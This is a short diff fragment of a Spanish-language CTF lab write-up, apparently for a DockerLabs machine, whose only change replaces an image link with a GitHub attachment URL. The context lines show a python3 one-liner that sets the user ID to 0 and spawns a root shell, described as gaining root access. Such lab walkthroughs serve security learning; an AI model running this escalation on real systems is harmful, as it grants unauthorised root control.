@@ -84,6 +84,6 @@ ejecutamos
      ./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 
 
-![[dockerlabs/dificil/rass/root.png]]
+![image](https://github.com/user-attachments/assets/044377e2-f107-446a-ba2b-627c5045e7aa)
 
 lanzamos y obtenemos acceso a root! 
